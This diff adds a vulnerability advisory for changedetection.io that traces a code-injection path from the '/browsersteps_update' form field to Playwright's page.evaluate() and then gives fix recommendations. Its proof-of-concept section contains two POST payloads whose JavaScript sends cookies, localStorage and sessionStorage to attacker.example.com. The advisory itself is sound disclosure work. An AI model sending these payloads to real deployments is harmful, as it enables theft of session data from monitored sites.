@@ -1,0 +1,188 @@
+# Code Injection via Unsanitized JavaScript Execution in Execute JS Browser Step (CWE-94)
+
+**BUG_Author:** herantong
+
+**Affected Version:** changedetection.io ≤ 0.55.8
+
+**Vendor:** [changedetection.io GitHub Repository](https://github.com/dgtlmoon/changedetection.io)
+
+**Software:** [changedetection.io](https://github.com/dgtlmoon/changedetection.io)
+
+**Vulnerability Files:**
+- `changedetectionio/browser_steps/browser_steps.py`
+- `changedetectionio/blueprint/browser_steps/__init__.py`
+
+---
+
+## Description
+
+### 1. Arbitrary JavaScript Execution via Execute JS Browser Step
+
+The `action_execute_js` method in `browser_steps.py` accepts a user-controlled `value` parameter and passes it directly to Playwright's `page.evaluate()` without any validation or sanitization, allowing arbitrary JavaScript execution in the browser context (CWE-94). The only check is `if not value`, which merely skips empty strings and provides no security filtering.
+
+### 2. Vulnerable Code Location
+
+The vulnerability is at `changedetectionio/browser_steps/browser_steps.py:176-180`:
+
+```python
+# changedetectionio/browser_steps/browser_steps.py:176-180
+async def action_execute_js(self, selector, value):
+    if not value:
+        return None
+
+    return await self.page.evaluate(value)
+```
+
+The `page.evaluate()` call executes the provided string as JavaScript in the browser page context. No whitelist, AST parsing, sandbox, or restriction on executable JavaScript operations exists.
+
+### 3. Data Flow from HTTP Endpoint to Sink
+
+The `action_execute_js` method is reached through `call_action` at `changedetectionio/browser_steps/browser_steps.py:75-127`:
+
+```python
+# changedetectionio/browser_steps/browser_steps.py:75-127
+async def call_action(self, action_name, selector=None, optional_value=None):
+    call_action_name = re.sub('[^0-9a-zA-Z]+', '_', action_name.lower())
+    if call_action_name == 'choose_one':
+        return
+    action_handler = getattr(self, "action_" + call_action_name)
+    await action_handler(selector, optional_value)
+```
+
+When `action_name` is `'Execute JS'`, `call_action_name` becomes `'execute_js'`, and `getattr(self, "action_execute_js")` resolves to the vulnerable method. The `optional_value` flows directly as the `value` parameter.
+
+The HTTP entry point is at `changedetectionio/blueprint/browser_steps/__init__.py:352-390`:
+
+```python
+# changedetectionio/blueprint/browser_steps/__init__.py:352-390
+@browser_steps_blueprint.route("/browsersteps_update", methods=['POST'])
+@login_optionally_required
+def browsersteps_ui_update():
+    step_operation = request.form.get('operation')
+    step_selector = request.form.get('selector')
+    step_optional_value = request.form.get('optional_value')
+    run_async_in_browser_loop(
+        browsersteps_sessions[browsersteps_session_id]['browserstepper'].call_action(
+            action_name=step_operation,
+            selector=step_selector,
+            optional_value=step_optional_value
+        )
+    )
+```
+
+The complete data flow: `request.form.get('optional_value')` → `call_action(optional_value=...)` → `action_execute_js(value=...)` → `page.evaluate(value)`. No validation or sanitization occurs at any point.
+
+### 4. Jinja2 Template Rendering Is Not a Security Control
+
+Inside `call_action`, a Jinja2 rendering check exists at lines 98-102:
+
+```python
+if optional_value and ('{%' in optional_value or '{{' in optional_value):
+    optional_value = jinja_render(template_str=optional_value)
+```
+
+This evaluates Jinja2 templates only when `{%` or `{{` patterns are present. Arbitrary JavaScript code without these patterns passes through unchanged. This is template processing, not a security filter.
+
+### 5. Authentication Context
+
+The route uses `@login_optionally_required`:
+
+```python
+@browser_steps_blueprint.route("/browsersteps_update", methods=['POST'])
+@login_optionally_required
+def browsersteps_ui_update():
+```
+
+Per `changedetectionio/auth_decorator.py:16-42`, this decorator only enforces login when a password is configured. If the application is deployed without a password (the default or common Docker configuration), the endpoint is accessible to unauthenticated users. Even when authenticated, any logged-in user can execute arbitrary JavaScript in the browser context.
+
+### 6. Weakened Browser Security Controls
+
+The browser context is created with `bypass_csp=True` and `ignore_https_errors=True` in two locations:
+
+`changedetectionio/browser_steps/browser_steps.py:359-363`:
+```python
+self.context = await self.playwright_browser.new_context(
+    accept_downloads=False,
+    bypass_csp=True,
+    extra_http_headers=self.headers,
+    ignore_https_errors=True,
+)
+```
+
+`changedetectionio/content_fetchers/playwright.py:285-291`:
+```python
+context = await browser.new_context(
+    accept_downloads=False,
+    bypass_csp=True,
+    extra_http_headers=request_headers,
+    ignore_https_errors=True,
+)
+```
+
+`bypass_csp=True` disables Content Security Policy enforcement, and `ignore_https_errors=True` ignores TLS certificate errors, further weakening the security posture of the browser context where injected JavaScript executes.
+
+---
+
+## Proof of Concept
+
+### 1. Inject Arbitrary JavaScript via HTTP POST
+
+```
+POST http://<target-host>/browsersteps_update
+Content-Type: application/x-www-form-urlencoded
+
+operation=Execute JS&optional_value=fetch('https://attacker.example.com/exfil?data=' + encodeURIComponent(document.cookie))
+```
+
+### 2. Access Sensitive Browser Context Data
+
+```
+POST http://<target-host>/browsersteps_update
+Content-Type: application/x-www-form-urlencoded
+
+operation=Execute JS&optional_value=fetch('https://attacker.example.com/', {method: 'POST', body: JSON.stringify({cookies: document.cookie, localStorage: JSON.stringify(localStorage), sessionStorage: JSON.stringify(sessionStorage)})})
+```
+
+### 3. Attack Flow
+
+1. An attacker sends a POST request to `/browsersteps_update` with `operation=Execute JS` and `optional_value` set to arbitrary JavaScript.
+2. The unsanitized JavaScript reaches `action_execute_js` and is passed to `page.evaluate()`.
+3. The JavaScript executes in the browser context with full access to cookies, localStorage, sessionStorage, and the DOM of the monitored page.
+4. The attacker can exfiltrate sensitive data, modify page content, or perform actions on behalf of the monitored site.
+5. With `bypass_csp=True` and `ignore_https_errors=True`, CSP restrictions and TLS certificate validation are both disabled, maximizing the attack surface.
+
+---
+
+## Root Cause Analysis
+
+| Question | Answer |
+|---|---|
+| Does user-controlled input reach a code execution point? | Yes — `request.form.get('optional_value')` flows to `page.evaluate(value)` at `browser_steps.py:180`. |
+| Is code evaluation performed on user data? | Yes — `page.evaluate()` executes the string as JavaScript in the browser context. |
+| Is there any validation, sanitization, or sandboxing? | No — the only check is `if not value`; no whitelist, AST parsing, or sandbox exists. |
+| Is the browser context hardened? | No — `bypass_csp=True` and `ignore_https_errors=True` weaken security controls. |
+| Is the endpoint protected by authentication? | Conditional — `@login_optionally_required` only enforces login when a password is set. |
+| Is the code in a test, demo, or dead-code context? | No — it is a live production endpoint in the core browser automation module. |
+
+**Verdict: Confirmed vulnerability (CWE-94 — Code Injection).**
+
+---
+
+## Fix Recommendations
+
+1. **Add Input Validation**: Implement a whitelist-based validator or a restricted JavaScript parser (e.g., using `esprima`/`acorn` AST with an allowed-node whitelist) before passing `value` to `page.evaluate()`.
+
+2. **Sandbox Execution**: Run `page.evaluate()` in a dedicated isolated page or iframe without access to cookies, localStorage, or the parent origin.
+
+3. **Require Explicit Opt-In**: Add a per-watch or per-user setting that requires the administrator to explicitly enable the `Execute JS` browser step, accompanied by a security impact warning.
+
+4. **Harden Browser Context**: Remove `bypass_csp=True` and `ignore_https_errors=True` where not strictly necessary, or make them per-watch opt-in settings rather than defaults.
+
+5. **Apply Consistent Validation Across All evaluate() Paths**: Ensure any code path reaching `page.evaluate()`, including `webdriver_js_execute_code` in `playwright.py:322`, applies the same validation.
+
+---
+
+## References
+
+- [CWE-94: Improper Control of Generation of Code (Code Injection)](https://cwe.mitre.org/data/definitions/94.html)
+- [Playwright `page.evaluate()` documentation](https://playwright.dev/python/docs/api/class-page#page-evaluate)
